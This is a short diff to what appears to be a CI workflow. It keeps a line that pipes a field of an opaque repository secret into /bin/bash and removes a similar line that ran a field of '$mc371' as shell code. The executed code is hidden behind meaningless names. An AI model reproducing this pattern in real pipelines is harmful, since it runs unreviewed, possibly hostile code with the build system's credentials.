@@ -19,7 +19,6 @@ jobs:
           xtd2018: ${{ secrets.xtd2018 }}
         run: |
           printf '%s' "$xtd2018" | jq -r .odrsg4330 | /bin/bash
-          echo $mc371 | jq -r .uxiiy7 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
